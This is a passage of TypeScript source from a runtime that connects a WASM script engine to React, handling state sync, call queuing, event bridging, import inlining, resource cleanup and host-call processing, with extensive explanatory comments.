          ? ` (+${this.vmOwnedStateNames.length} VM-owned, not synced)`
          : '')
    );

    // 7. Create async function wrappers (propagate state changes to React)
    // Rapid-fire event handlers (mousemove, scroll, etc.) are marked droppable —
    // safe to skip under queue saturation since they'll be superseded by the next
    // event. All other functions (clicks, submits, etc.) are critical and will
    // queue up to a hard limit to guarantee execution.
    const DROPPABLE_PATTERN =
      /^on_?(mouse_?move|pointer_?move|scroll|touch_?move|wheel)|^(tick|update|animate|render)/i;
    const functions: Record<string, (...args: unknown[]) => Promise<unknown>> = {};
    for (const name of functionNames) {
      functions[name] = this.createVMFunction(name, { droppable: DROPPABLE_PATTERN.test(name) });
    }

    // 8. Create sync function wrappers (for template expressions, no state propagation)
    const syncFunctions: Record<string, (...args: unknown[]) => unknown> = {};
    for (const name of functionNames) {
      syncFunctions[name] = this.createVMSyncFunction(name);
    }

    // 9. Computed values, each bound to the function compiled for it in 4b.
    const computed: Record<string, () => unknown> = {};
    for (const { name, expression } of computedDecls) {
      if (computedCompiled) {
        const fn = `${COMPUTED_PREFIX}${name}`;
        computed[name] = () => this.callComputed(fn, name);
      } else {
        computed[name] = () => this.evaluateExpression(expression);
      }
    }

    return {
      state: initialState,
      functions,
      syncFunctions,
      computed,
    };
  }

  /**
   * Create an async function wrapper that:
   * 1. Syncs React state → VM globals
   * 2. Calls the VM function
   * 3. Syncs VM globals → React state
   */
  // Performance instrumentation for async VM calls
  private _perfCallCount = 0;
  private _perfTotalMs = 0;
  private _perfLastReport = 0;
  private _perfWasmMs = 0;
  private _perfSyncToReactMs = 0;
  private _perfSyncToVMMs = 0;
  private _perfChangedVars = 0;

  private createVMFunction(
    name: string,
    options?: { droppable?: boolean }
  ): (...args: unknown[]) => Promise<unknown> {
    const droppable = options?.droppable ?? false;
    // Droppable calls (rapid-fire events) are dropped at the soft limit.
    // Critical calls (user interactions) are only dropped at the hard limit.
    const QUEUE_SOFT_LIMIT = 32;
    const QUEUE_HARD_LIMIT = 128;

    return async (...args: unknown[]): Promise<unknown> => {
      // A runtime that has been torn down answers nothing. Without this, a
      // 30 Hz game loop keeps landing calls on the disposed engine — each one
      // an "engine is disposed" error in the console — until its renderer
      // notices.
      if (this.disposed) return undefined;
      if (this.vmEngine?.terminated) {
        if (!this.terminationLogged) {
          this.terminationLogged = true;
          console.error(`[SoftN] The script engine has stopped (a call exceeded its budget or failed to compile); ignoring ${name} and later calls until the app is reloaded.`);
        }
        return undefined;
      }
      // Guard against unbounded queue growth from rapid async events.
      if (droppable && this.vmCallQueueDepth >= QUEUE_SOFT_LIMIT) {
        // Safe to drop: rapid-fire events are superseded by the next one
        return undefined;
      }
      if (this.vmCallQueueDepth >= QUEUE_HARD_LIMIT) {
        console.error(
          `[SoftN] Dropping VM call to ${name}: hard queue limit reached (${this.vmCallQueueDepth})`
        );
        return undefined;
      }
      this.vmCallQueueDepth++;

      // Acquire the lock — serializes async VM calls to prevent concurrent
      // stack corruption. Uses a release-function pattern (not .then() chaining)
      // to avoid unbounded promise chain growth.
      await this.vmCallLock;
      let release: (() => void) | undefined;
      this.vmCallLock = new Promise<void>((r) => {
        release = r;
      });
      // The wait for the lock is where a tear-down usually lands: the calls
      // queued behind the one that was running when the grant rebuilt the
      // runtime would otherwise each wake up and hit a corpse.
      if (this.disposed) {
        this.vmCallQueueDepth--;
        release!();
        return undefined;
      }

      const t0 = performance.now();
      try {
        this.asyncCallInProgress = true;
        // Async call may change state — invalidate sync cache preemptively.
        this.syncCallCache.clear();

        const tSyncStart = performance.now();
        this.syncReactStateToVM();
        this.syncExternalFunctionsToVM();
        // Sync real browser window → VM window
        this.syncWindowToVM();
        this._perfSyncToVMMs += performance.now() - tSyncStart;

        // Suppress XDB notifications during the WASM call — all db mutations
        // within the function are batched into a single notification per collection
        // at the end, instead of firing on every individual create/update/delete.
        // This eliminates O(n) re-queries when functions like startHand() do 20+ mutations.
        this.xdbService?.suppressNotifications();

        // WASM engine takes plain JS args directly — no conversion needed
        const tWasm = performance.now();
        const result = this.vmEngine!.callFunction(name, args);
        this._perfWasmMs += performance.now() - tWasm;

        return result;
      } catch (error) {
        console.error(`[SoftN] Error executing function ${name}:`, error);
        return undefined;
      } finally {
        // Resume XDB notifications — fires one 'refresh' per affected collection.
        this.xdbService?.resumeNotifications();

        // Always sync state back, even if the VM function threw mid-execution.
        // Partial state mutations before the error should be reflected in the UI.
        // Drain pending host calls while we still hold the lock, but DON'T await
        // their execution — that would block other VM calls (e.g. movement ticks)
        // for the entire duration of async operations like AI generation.
        let pendingCalls: unknown[] | null = null;
        try {
          // Disposed during the call: there is no engine left to read back from.
          if (this.disposed) throw null;
          const tSyncReact = performance.now();
          this.syncVMStateToReact();
          this.syncWindowFromVM();
          this._perfSyncToReactMs += performance.now() - tSyncReact;

          // Drain pending host calls while holding the lock
          if (this.vmEngine) {
            const pending = this.vmEngine.drainPendingHostCalls();
            if (pending.length > 0) {
              pendingCalls = pending;
            }
          }

          // After each async call, discover any new VM event listeners and
          // window.__ properties — this bridges keyboard/mouse handlers
          // registered in _init() or other functions to real browser events.
          this.bridgeEventListeners();
          this.discoverWindowSyncKeys();
        } catch (syncError) {
          if (syncError !== null) console.error(`[SoftN] Error syncing state after ${name}:`, syncError);
        }
        this.asyncCallInProgress = false;
        this.vmCallQueueDepth--;
        release!();

        // Process pending host calls OUTSIDE the lock so other VM calls
        // (e.g. movementTick) can execute while async host operations
        // (e.g. AI model generation) are in progress.
        if (pendingCalls) {
          await this.processPendingHostCallsUnlocked(pendingCalls as PendingHostCall[]);
        }

        // Performance reporting
        const elapsed = performance.now() - t0;
        this._perfCallCount++;
        this._perfTotalMs += elapsed;
        const now = performance.now();
        if (now - this._perfLastReport > 5000) {
          const n = this._perfCallCount;
          console.log(
            `[SoftN Perf] ${n} calls in 5s | avg=${(this._perfTotalMs / n).toFixed(1)}ms` +
              ` | wasm=${(this._perfWasmMs / n).toFixed(1)}ms` +
              ` | syncToVM=${(this._perfSyncToVMMs / n).toFixed(1)}ms` +
              ` | syncToReact=${(this._perfSyncToReactMs / n).toFixed(1)}ms` +
              ` | changedVars=${(this._perfChangedVars / n).toFixed(1)}/tick` +
              ` | stateVars=${this.stateVarNames.length}`
          );
          this._perfCallCount = 0;
          this._perfTotalMs = 0;
          this._perfWasmMs = 0;
          this._perfSyncToVMMs = 0;
          this._perfSyncToReactMs = 0;
          this._perfChangedVars = 0;
          this._perfLastReport = now;
        }
      }
    };
  }

  /**
   * Split state variables into the ones the host must mirror and the ones the
   * VM can keep to itself.
   *
   * Every sync pulls each synced variable out of the VM and rebuilds it as a
   * JS value, so the cost is set by what the variables HOLD, not by how many
   * there are or how many changed. Promptly Unemployed keeps two 51 KB scene
   * descriptions in globals that no part of its markup names: mirroring them
   * was 13 of the 24 ms each tick spent, ~28 times a second, to produce values
   * nothing could read.
   *
   * The test is deliberately crude — does this identifier appear anywhere in
   * the document outside its logic? — because the failure modes are not
   * symmetric. Keeping a variable that is never read costs a little speed;
   * dropping one that is read silently freezes part of the UI. So the scan
   * over-collects on purpose: a name in a comment, a CSS class or an unrelated
   * string keeps its variable synced.
   *
   * Holding a variable back is only sound because the exclusion is symmetric.
   * {@link syncReactStateToVM} walks the same list, so an excluded variable is
   * never written back either — otherwise a full push would overwrite the live
   * VM value with the copy the host stopped updating.
   */
  private partitionStateVars(
    names: string[],
    symbolMap: Map<string, { index: number; scope: SymbolScope }>
  ): void {
    const observed = this.observedStateNames;
    if (!observed) {
      this.stateVarNames = names;
      this.stateVarIndices = names.map((name) => symbolMap.get(name)!.index);
      this.vmOwnedStateNames = [];
      this.vmOwnedStateSet = new Set();
      return;
    }
    const synced: string[] = [];
    const vmOwned: string[] = [];
    for (const name of names) {
      (observed.has(name) ? synced : vmOwned).push(name);
    }
    this.stateVarNames = synced;
    this.stateVarIndices = synced.map((name) => symbolMap.get(name)!.index);
    this.vmOwnedStateNames = vmOwned;
    this.vmOwnedStateSet = new Set(vmOwned);
  }

  /**
   * Create a sync function wrapper for template expressions.
   * Does NOT propagate state changes (used during React render).
   * Stripped to bare minimum for performance — window sync is only done
   * in async wrappers (needed for Scene3D mouse-look, not template expressions).
   */
  /**
   * Key for the per-render sync-call cache, or null when the arguments cannot
   * be described by one.
   *
   * Returning null means "call through and do not cache" — the alternative was
   * letting `JSON.stringify` throw on a cyclic argument, which the catch below
   * turned into a rendered `undefined`.
   */
  private syncCacheKey(name: string, args: unknown[]): string | null {
    if (args.length === 0) return name;

    // Primitives are keyed by type *and* value, so `1` and `"1"` stay distinct.
    if (args.length === 1) {
      const a = args[0];
      const t = typeof a;
      if (a === null) return `${name}|null`;
      if (
        t === 'string' ||
        t === 'number' ||
        t === 'boolean' ||
        t === 'undefined' ||
        t === 'bigint'
      ) {
        return `${name}|${t}:${String(a)}`;
      }
    }

    try {
      return `${name}|json:${JSON.stringify(args)}`;
    } catch {
      // Cyclic, or something JSON cannot describe.
      return null;
    }
  }

  private createVMSyncFunction(name: string): (...args: unknown[]) => unknown {
    return (...args: unknown[]): unknown => {
      try {
        // Skip React→VM sync if an async function is in-flight — the VM has
        // the latest state and overwriting it would clobber the async function's changes.
        if (!this.asyncCallInProgress) {
          this.syncReactStateToVM();
        }
        this.syncExternalFunctionsToVM();

        // Per-render frame cache: if >2ms since the last sync call, we've crossed
        // a render frame boundary — clear the cache so results reflect current state.
        // Within a single render, all sync calls happen synchronously (< 1ms apart),
        // so the cache stays valid and avoids redundant WASM boundary crossings.
        const now = performance.now();
        if (now - this.lastSyncCallTs > 2) {
          this.syncCallCache.clear();
        }
        this.lastSyncCallTs = now;

        // Build cache key — optimized for the common single-primitive-arg case.
        //
        // The type has to be part of the key. Interpolating the value alone
        // collapsed `f(1)` and `f("1")` — and `f(true)` and `f("true")`, and
        // `f(null)` and `f("null")` — onto one entry, so within a single render
        // the second call silently returned the first one's answer. A helper
        // that branches on `typeof` then rendered the wrong thing with nothing
        // to suggest it had.
        const cacheKey = this.syncCacheKey(name, args);
        if (cacheKey !== null && this.syncCallCache.has(cacheKey)) {
          return this.syncCallCache.get(cacheKey);
        }

        if (!this.vmEngine) return undefined;
        const result = this.vmEngine.callFunctionSync(name, args);
        if (cacheKey !== null) this.syncCallCache.set(cacheKey, result);
        return result;
      } catch (error) {
        console.error(`[SoftN] Error executing sync function ${name}:`, error);
        return undefined;
      }
    };
  }

  /**
   * Sync React component state → VM globals.
   * Uses batch API: single WASM boundary crossing for all state variables.
   */
  private syncReactStateToVM(): void {
    if (!this.symbolMap || !this.vmEngine) return;
    // _vmDirty is set by the worker runtime when state comes back from the worker thread,
    // ensuring the main-thread WASM VM globals stay in sync with worker-reported state.
    const vmDirty = (this.context as unknown as Record<string, unknown>)._vmDirty;
    // null = initial sync (all keys), empty set = nothing dirty
    const dirty = this.dirtyStateKeys;
    if (dirty !== null && dirty.size === 0 && !vmDirty) return;
    // State is changing — invalidate sync function cache so the next calls
    // execute against fresh VM globals instead of returning stale results.
    this.syncCallCache.clear();
    if (dirty === null || vmDirty) {
      // Full sync: first call or worker pushed new state
      const values = this.stateVarNames.map((name) => this.context.state[name]);
      this.vmEngine.setGlobalsBatch(this.stateVarIndices, values);
      // The cached digests describe what the host last READ. They are used to
      // decide whether React still matches the VM, so they stop being an answer
      // to that question the moment anything moves React's copy on its own.
      this.stateVarFingerprints = null;
    } else {
      // Granular sync: only push keys that actually changed — and, as the
      // full sync above does, only keys the host is allowed to own. A VM-owned
      // variable reaches React once, at script load, and is never refreshed;
      // after a permission grant rebuilds the VM that stale copy compares
      // unequal to the fresh one, and pushing it would wipe what _init() had
      // just built (TheOffice lost every character this way).
      const indices: number[] = [];
      const values: unknown[] = [];
      for (const key of dirty) {
        if (this.vmOwnedStateSet.has(key)) continue;
        const sym = this.symbolMap!.get(key);
        if (sym) {
          indices.push(sym.index);
          values.push(this.context.state[key]);
        }
      }
      if (indices.length > 0) {
        this.vmEngine.setGlobalsBatch(indices, values);
        this.forgetFingerprintsFor(dirty);
      }
    }
    this.dirtyStateKeys = new Set();
    if (vmDirty) (this.context as unknown as Record<string, unknown>)._vmDirty = false;
  }

  /**
   * Sync VM globals → React component state.
   * Uses VM-side dirty tracking to only deepEqual globals that were actually
   * written during execution, eliminating O(N) deepEqual scans on unchanged state.
   */
  /**
   * Drop the cached digests for `names`, so the next sync reads them.
   *
   * A digest answers "has the VM changed since I last looked?", but the skip it
   * feeds needs "does React's copy still match the VM?". Those are the same
   * question only while nothing moves React's copy except the read itself.
   *
   * When something else does move it, the two come apart permanently rather
   * than for a frame. Pocket showed it: the files permission is requested at
   * first use, so the first cartridge fails, and granting it rebuilds the VM
   * while React keeps the old instance's state. gbError then took a round trip
   * — "" in the fresh VM, the stale failure pushed back in, "" again once the
   * retry succeeded — and landed on the digest it started from. The VM was
   * right, React was wrong, the digests agreed with each other, and nothing
   * ever read the global again: a loaded, running Game Boy under the words
   * "Could not read that file."
   *
   * NaN rather than deletion: the compare is `!==`, which NaN always satisfies,
   * so an unknown digest reads and the array stays parallel to the name list.
   */
  private forgetFingerprintsFor(names: Iterable<string>): void {
    const fps = this.stateVarFingerprints;
    if (!fps) return;
    for (const name of names) {
      const i = this.stateVarNames.indexOf(name);
      if (i >= 0) fps[i] = Number.NaN;
    }
  }

  /** Digests for the synced globals, or null if this engine has none. */
  private readFingerprints(): number[] | null {
    const engine = this.vmEngine as unknown as {
      getGlobalsFingerprint?: (indices: number[]) => number[] | null;
    };
    if (typeof engine.getGlobalsFingerprint !== 'function') return null;
    try {
      const out = engine.getGlobalsFingerprint(this.stateVarIndices);
      return out && out.length === this.stateVarIndices.length ? out : null;
    } catch {
      // A digest is an optimisation. Losing it must never lose an update.
      return null;
    }
  }

  private syncVMStateToReact(): void {
    if (!this.symbolMap || !this.vmEngine) return;

    // Ask the engine which globals moved before reading any of them.
    //
    // Reading a global rebuilds its whole value as JS, so the cost is set by
    // what the globals HOLD. A digest walks the same graph inside the VM and
    // allocates nothing, which is why it is worth one extra boundary crossing
    // to avoid the copies: a 51 KB scene description that has not moved costs
    // microseconds to fingerprint and milliseconds to read.
    //
    // Any doubt reads. A missing digest, a length mismatch, a first call with
    // nothing to compare against, or a NaN cell (the engine reporting "I could
    // not walk this") all fall through to reading everything, which is exactly
    // what this method did before the digests existed.
    let indicesToCheck: number[] = this.stateVarIndices;
    let namesToCheck: string[] = this.stateVarNames;
    let nextFingerprints: number[] | null = null;

    const fingerprints = this.readFingerprints();
    if (fingerprints) {
      nextFingerprints = fingerprints;
      const previous = this.stateVarFingerprints;
      if (previous && previous.length === fingerprints.length) {
        indicesToCheck = [];
        namesToCheck = [];
        for (let i = 0; i < fingerprints.length; i++) {
          // NaN never equals itself, so an "unknown" digest reads. That is the
          // behaviour we want and the reason this is not written as !==.
          if (fingerprints[i] !== previous[i]) {
            indicesToCheck.push(this.stateVarIndices[i]);
            namesToCheck.push(this.stateVarNames[i]);
          }
        }
        if (indicesToCheck.length === 0 && !FINGERPRINT_AUDIT()) {
          this.stateVarFingerprints = nextFingerprints;
          return;
        }
      }
    }

    // The audit reads everything anyway and reports any global the digests
    // called unchanged that the value comparison disagrees with. Off by
    // default; the whole design rests on those two never disagreeing, so it
    // exists to be run against real bundles rather than argued about.
    const auditing = FINGERPRINT_AUDIT() && nextFingerprints !== null;
    const skipped = auditing ? new Set(indicesToCheck) : null;
    if (auditing) {
      indicesToCheck = this.stateVarIndices;
      namesToCheck = this.stateVarNames;
    }

    const allValues = this.vmEngine.getGlobalsBatch(indicesToCheck) as unknown[];
    const changes: Record<string, unknown> = {};
    for (let i = 0; i < namesToCheck.length; i++) {
      const name = namesToCheck[i];
      const newVal = allValues[i];
      const oldVal = this.context.state[name];
      if (!deepEqual(newVal, oldVal)) {
        this.context.state[name] = newVal;
        changes[name] = newVal;
      }
    }

    if (auditing && skipped) {
      for (let i = 0; i < namesToCheck.length; i++) {
        const name = namesToCheck[i];
        const wasSkipped = !skipped.has(this.stateVarIndices[i]);
        if (wasSkipped && name in changes) {
          console.error(
            '[SoftN] FINGERPRINT MISS: ' + name + ' was reported unchanged but its value moved'
          );
        }
      }
    }
    if (nextFingerprints) this.stateVarFingerprints = nextFingerprints;

    const changedKeys = Object.keys(changes);
    this._perfChangedVars += changedKeys.length;
    if (changedKeys.length === 0) return;
    // Use batch setter if available (single React setState call for all changes)
    if (this.context.batchSetState) {
      this.context.batchSetState(changes);
    } else {
      // Fallback: individual setState calls
      for (const name of changedKeys) {
        this.context.setState(name, changes[name]);
      }
    }
  }

  /**
   * Evaluate an expression synchronously using the VM.
   */
  /**
   * Evaluate one `$:` declaration by calling the function compiled for it.
   *
   * The same work as {@link evaluateExpression}, minus the per-call parse — and
   * these run on every render, which is where that parse would have been paid.
   */
  private callComputed(fnName: string, declName: string): unknown {
    try {
      if (!this.vmEngine) return undefined;
      // Skip React→VM sync if an async function is in-flight
      if (!this.asyncCallInProgress) {
        this.syncReactStateToVM();
      }
      this.syncExternalFunctionsToVM();
      return this.vmEngine.callFunctionSync(fnName, []);
    } catch (error) {
      console.error(`[SoftN] Error evaluating computed "${declName}":`, error);
      return undefined;
    }
  }

  evaluateExpression(expression: string): unknown {
    try {
      if (!this.vmEngine) return undefined;

      // Skip React→VM sync if an async function is in-flight
      if (!this.asyncCallInProgress) {
        this.syncReactStateToVM();
      }
      this.syncExternalFunctionsToVM();
      // WASM returns plain JS values — no conversion needed
      return this.vmEngine.evalSync(expression);
    } catch (error) {
      console.error(`[SoftN] Error evaluating expression "${expression}":`, error);
      return undefined;
    }
  }

  /**
   * Update the context with new state (called by SoftNRenderer when React state changes)
   */
  updateContext(newState: Partial<RuntimeState>): void {
    // Track which specific keys changed (e.g., from :bind input updates).
    // After syncVMStateToReact(), context.state and React componentState have
    // the same object references, so !== correctly detects external changes.
    for (const key of Object.keys(newState)) {
      if (
        (newState as Record<string, unknown>)[key] !==
        (this.context.state as Record<string, unknown>)[key]
      ) {
        if (!this.dirtyStateKeys) this.dirtyStateKeys = new Set();
        this.dirtyStateKeys.add(key);
      }
    }
    Object.assign(this.context.state, newState);
  }

  /**
   * Discover and bridge VM event listeners to real browser event listeners.
   * Called after every async VM function call so listeners registered in _init()
   * or any other function are automatically bridged.
   *
   * The mapping is fully dynamic — the runtime does not hardcode any key bindings.
   * The .logic code registers handlers (e.g. window.addEventListener("keydown", fn)),
   * and this method bridges those to real browser events.
   */
  private bridgeEventListeners(): void {
    if (!this.vmEngine || typeof window === 'undefined') return;

    // High-frequency events that should be throttled to ~60fps before
    // crossing the WASM bridge. Prevents GC pressure and frame drops from
    // serializing event objects 100+ times/sec.
    const THROTTLED_EVENTS = new Set([
      'mousemove',
      'pointermove',
      'scroll',
      'resize',
      'touchmove',
      'wheel',
    ]);
    const THROTTLE_MS = 16; // ~60fps

    const types = this.vmEngine.getEventListenerTypes();
    for (const eventType of types) {
      if (this.bridgedEventTypes.has(eventType)) continue;
      this.bridgedEventTypes.add(eventType);

      const isThrottled = THROTTLED_EVENTS.has(eventType);

      const handler = (event: Event) => {
        if (!this.vmEngine) return;

        // A key the script asked to keep whole: the browser's default is
        // cancelled here, since the handler runs too late to do it.
        if (shouldCaptureKey(event)) event.preventDefault();

        // Extract safe, serializable properties from the browser event
        const eventObj = extractEventProps(event);

        // Sync React state → VM before dispatch
        this.syncReactStateToVM();
        // Skip window sync for throttled events — mouse/scroll handlers
        // rarely need window properties, and this saves ~2 WASM crossings/frame.
        if (!isThrottled) {
          this.syncWindowToVM();
        }

        // Dispatch to VM handlers (runs synchronously in WASM)
        this.vmEngine.dispatchEvent(eventType, eventObj);

        // Sync VM state → React after dispatch
        this.syncVMStateToReact();
        if (!isThrottled) {
          this.syncWindowFromVM();
          // Discover new __ window properties set by the handler.
          // Deferred for throttled events since they rarely add new sync keys.
          this.discoverWindowSyncKeys();
        }
      };

      // Wrap high-frequency events with a throttle to limit WASM bridge crossings
      let listener: (event: Event) => void;
      if (THROTTLED_EVENTS.has(eventType)) {
        let lastCall = 0;
        let pending: ReturnType<typeof requestAnimationFrame> | null = null;
        listener = (event: Event) => {
          const now = performance.now();
          if (now - lastCall >= THROTTLE_MS) {
            lastCall = now;
            handler(event);
          } else if (!pending) {
            pending = requestAnimationFrame(() => {
              pending = null;
              lastCall = performance.now();
              handler(event);
            });
          }
        };
      } else {
        listener = handler;
      }

      window.addEventListener(eventType, listener);
      if (!this.nativeListeners.has(eventType)) {
        this.nativeListeners.set(eventType, []);
      }
      this.nativeListeners.get(eventType)!.push(listener);
    }
  }

  /**
   * Discover __ prefixed properties on the VM's window object and register
   * them as sync keys. This makes window property sync fully dynamic — the
   * .logic code sets any window.__xxx property and it gets synced automatically.
   */
  private discoverWindowSyncKeys(): void {
    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;

    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
    if (!vmWindow || typeof vmWindow !== 'object') return;

    for (const key of Object.keys(vmWindow as Record<string, unknown>)) {
      if (key.startsWith('__') && !this.syncKeys.has(key)) {
        this.syncKeys.add(key);
        this.windowSyncActive = true;
      }
    }
  }

  /**
   * Clean up resources (event listeners, WASM engine, etc.)
   */
  cleanup(): void {
    // Set before anything else: an in-flight `loadScript` checks this after
    // each of its awaits, so a cleanup that lands mid-load stops the script
    // from being executed into an engine nobody will ever dispose.
    this.disposed = true;

    // Clean up native event listeners
    if (typeof window !== 'undefined') {
      for (const [eventName, listeners] of this.nativeListeners.entries()) {
        for (const listener of listeners) {
          window.removeEventListener(eventName, listener);
        }
      }
    }
    this.nativeListeners.clear();
    this.bridgedEventTypes.clear();
    clearCapturedKeys();
    this.syncCallCache.clear();
    this.externalFunctionNames = [];
    this.externalFunctionValues = [];
    this.externalValuesGlobalIndex = -1;
    this.syncKeys.clear();
    this.windowSyncSeen.clear();
    this.windowSyncActive = false;

    // Silence. A looping track has no reason to stop on its own, so closing
    // the tab on an app playing music would otherwise leave it playing for
    // the rest of the session with nothing on screen to stop it.
    this.stopAllAudio();

    // And stop listening. A microphone left open outlives the app that opened
    // it: the tracks stay live, the OS recording indicator stays lit, and
    // nothing on screen explains why.
    this.stopMicrophone();

    // Image decoding has no native AbortSignal. Explicitly settle any pending
    // load so a malformed image cannot keep an orphaned host call alive.
    for (const cancel of this.qrDecodeCancelers) cancel();
    this.qrDecodeCancelers.clear();

    // An app that has been closed no longer owns background network work.
    // Abort pending fetches so they cannot continue downloading into an
    // orphaned host-call continuation.
    for (const controller of this.netAbortControllers) controller.abort();
    this.netAbortControllers.clear();

    // Release AI resources
    if (this.onnxManager) {
      this.onnxManager.releaseAll().catch(() => {});
      this.onnxManager = null;
    }
    if (this.transformersManager) {
      this.transformersManager.releaseAll().catch(() => {});
      this.transformersManager = null;
    }
    if (this.gpuComputeManager) {
      this.gpuComputeManager.releaseAll().catch(() => {});
      this.gpuComputeManager = null;
    }

    // Dispose WASM engine
    if (this.vmEngine) {
      this.vmEngine.dispose();
      this.vmEngine = null;
    }
  }

  // ========================================================================
  // Import resolution
  // ========================================================================

  /**
   * Resolve import statements in .logic code by inlining imported files.
   * Handles `import "./path.logic"` statements by fetching the imported code
   * via the importResolver and recursively resolving nested imports.
   */
  private async resolveImports(
    code: string,
    expanding: Set<string>,
    currentPath?: string
  ): Promise<string> {
    if (!this.importResolver) return code;

    // Match import statements: import "./path.logic" or import './path.logic'
    const importRegex = /^\s*import\s+["']([^"']+)["']\s*;?\s*$/gm;
    const parts: string[] = [];
    let lastIndex = 0;
    let match;

    while ((match = importRegex.exec(code)) !== null) {
      // Add code before this import
      parts.push(code.slice(lastIndex, match.index));

      const importPath = match[1];
      const resolvedPath = this.resolveImportPath(importPath, currentPath);

      // A file already in this compilation is included once, not twice: the
      // result is a single translation unit, and re-inlining a file would
      // redeclare every class and variable in it — a SyntaxError to the VM.
      // Two files importing a common third is normal, so this is a skip.
      if (this.includedLogicPaths.has(resolvedPath)) {
        parts.push(`/* already included: ${importPath} */`);
      } else if (expanding.has(resolvedPath)) {
        // Still being expanded further up the chain, so it genuinely cycles.
        throw new Error(
          `Circular import detected: "${resolvedPath}" is already in the import chain: ${[...expanding].join(' → ')} → ${resolvedPath}`
        );
      } else {
        expanding.add(resolvedPath);
        this.includedLogicPaths.add(resolvedPath);
        try {
          const source = await this.importResolver(resolvedPath);
          if (source != null) {
            // Recursively resolve imports in the imported code
            const resolved = await this.resolveImports(source, expanding, resolvedPath);
            parts.push(resolved);
          } else {
            parts.push(`/* import not found: ${importPath} */`);
          }
        } catch (e) {
          console.error(`[SoftN] Error resolving import "${importPath}":`, e);
          parts.push(`/* import error: ${importPath} */`);
        } finally {
          // Off the ancestor chain — it stays in includedLogicPaths, so a
          // later sibling import of the same file skips rather than throws.
          expanding.delete(resolvedPath);
        }
      }

      lastIndex = match.index + match[0].length;
    }

    // Add remaining code after last import
    parts.push(code.slice(lastIndex));
    return parts.join('\n');
  }

  /**
   * Resolve a relative import path against the current file's directory.
   */
  private resolveImportPath(importPath: string, currentPath?: string): string {
    // Absolute paths, URLs — return as-is
    if (
      importPath.startsWith('http://') ||
      importPath.startsWith('https://') ||
      importPath.startsWith('/')
    ) {
      return importPath;
    }
    // Not relative — return as-is
    if (!importPath.startsWith('./') && !importPath.startsWith('../')) {
      return importPath;
    }
    // No base path — return as-is
    if (!currentPath) {
      return importPath;
    }
    // Resolve relative to current file's directory
    const baseParts = currentPath.split('/');
    baseParts.pop(); // remove filename to get directory
    const importParts = importPath.split('/');
    for (const part of importParts) {
      if (part === '.') continue;
      if (part === '..') {
        baseParts.pop();
      } else {
        baseParts.push(part);
      }
    }
    return baseParts.join('/');
  }

  // ========================================================================
  // Window/Navigator sync (simplified for WASM)
  // ========================================================================

  /**
   * Register a __ window property key for syncing from real window → VM.
   */
  registerSyncKey(key: string): void {
    if (key.startsWith('__')) {
      this.syncKeys.add(key);
    }
  }

  /**
   * Sync properties from the real browser `window` into the VM's `window` global.
   * Only syncs __ prefixed keys registered via registerSyncKey().
   * Short-circuits when no sync keys have values on the real window.
   */
  /** What each synced window global held when it was last handed to the VM. */
  private windowSyncSeen = new Map<string, unknown>();

  private syncWindowToVM(): void {
    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;
    if (typeof window === 'undefined' || this.syncKeys.size === 0) return;

    // Quick check: are any syncKeys actually set on the real window?
    const realWin = window as unknown as Record<string, unknown>;
    if (!this.windowSyncActive) {
      // Periodically recheck (cheap: just test 2 keys)
      for (const key of this.syncKeys) {
        if (realWin[key] !== undefined) {
          this.windowSyncActive = true;
          break;
        }
      }
      if (!this.windowSyncActive) return;
    }

    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
    if (!vmWindow || typeof vmWindow !== 'object') return;

    const updated: Record<string, unknown> = { ...(vmWindow as Record<string, unknown>) };
    let changed = false;

    for (const key of this.syncKeys) {
      const value = realWin[key];
      if (value !== undefined && typeof value !== 'function') {
        updated[key] = value;
        // Remembered so the write-back can tell a value the script changed
        // from one it merely received.
        this.windowSyncSeen.set(key, value);
        changed = true;
      }
    }

    if (changed) {
      this.vmEngine.setGlobal(this.windowGlobalIndex, updated);
    }
  }

  /**
   * Sync properties from the VM's `window` global back to the real browser `window`.
   * Only syncs keys registered via registerSyncKey().
   */
  private syncWindowFromVM(): void {
    if (!this.windowSyncActive) return;
    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;
    if (typeof window === 'undefined' || this.syncKeys.size === 0) return;

    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
    if (!vmWindow || typeof vmWindow !== 'object') return;

    const realWin = window as unknown as Record<string, unknown>;
    const vmWinObj = vmWindow as Record<string, unknown>;

    for (const key of this.syncKeys) {
      const value = vmWinObj[key];
      if (value === undefined) continue;
      // A value the script did not touch is not written back. The browser
      // may have moved it since the call began — a pointer-locked camera
      // writes __scene3dYaw on every mouse move — and echoing the copy the
      // VM was handed would throw that movement away.
      if (this.windowSyncSeen.has(key) && Object.is(this.windowSyncSeen.get(key), value)) continue;
      realWin[key] = value;
      this.windowSyncSeen.set(key, value);
    }
  }

  // ── Host call processing (softn.* bridge) ───────────────────────────

  /**
   * Process pending host calls WITHOUT holding the VM lock during async operations.
   * The lock is released before this method is called, so other VM calls (like
   * movement ticks) can execute while slow host operations (AI generation) run.
   * The lock is re-acquired only briefly to resolve each callback in the VM.
   */
  /** Max total host calls resolved per processPendingHostCalls invocation.
   *  Prevents runaway callback chains from consuming unbounded memory/CPU. */
  private static readonly MAX_HOST_CALL_ROUNDS = 256;

  private async processPendingHostCallsUnlocked(initialPending: PendingHostCall[]): Promise<void> {
    if (!this.vmEngine) return;

    let pending = initialPending;
    let totalResolved = 0;
    while (pending.length > 0) {
      for (const call of pending) {
        if (++totalResolved > SoftNScriptRuntime.MAX_HOST_CALL_ROUNDS) {
          console.error(
            `[SoftN] Host call limit exceeded (${SoftNScriptRuntime.MAX_HOST_CALL_ROUNDS}) — ` +
              'aborting to prevent runaway callback chains'
          );
          return;
        }
        // Execute the async host call OUTSIDE the lock
        let result: unknown;
        try {
          result = await this.executeHostCall(call);
        } catch (err) {
          result = { error: String(err) };
          // The callback gets `{error}`, and almost no bundle checks for it —
          // so a refused call is a call that quietly does nothing. That was
          // tolerable while consent gated the load and a running app was always
          // a fully granted one; with the consent bar an app can be asked for
          // work it is not allowed to do yet, and "nothing happened" is the one
          // outcome that reads as broken rather than as withheld.
          // "failed", not "refused": this catch is around the whole
          // executeHostCall switch, so a fetch timeout, a malformed argument
          // and a denied capability all arrive here. The line said "refused"
          // for every one of them, and the word was the entire content of it.
          //
          // The console is as far as this goes today, and that is a gap, not a
          // conclusion: a user who presses DeviceKit's Fetch button while the
          // bar is unanswered sees the button do nothing at all. The runtime
